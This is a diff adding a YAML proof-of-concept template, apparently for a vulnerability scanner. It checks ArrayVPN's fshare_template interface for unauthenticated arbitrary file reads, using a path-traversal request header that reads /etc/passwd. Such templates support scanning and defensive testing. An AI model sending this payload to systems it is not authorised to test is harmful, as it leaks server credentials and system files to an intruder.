@@ -1,0 +1,15 @@
+name: poc-yaml-ArrayVPN-fshare-template-file-read
+rules:
+  - method: GET
+    path: /prx/000/http/localhost/client_sec/%00../../../addfolder
+    headers:
+      X_AN_FILESHARE: "uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd"
+    follow_redirects: false
+    expression: |
+      response.body.bcontains(bytes("root"))
+detail:
+    info: |
+       Array的 fshare_template 接口可构造特定的请求包进行未授权任意文件读取，从而造成服务器敏感信息泄露。
+    author: test
+    links:
+        - https://mp.weixin.qq.com/s/pJQIAox1EK9gE-XHF62UuQ
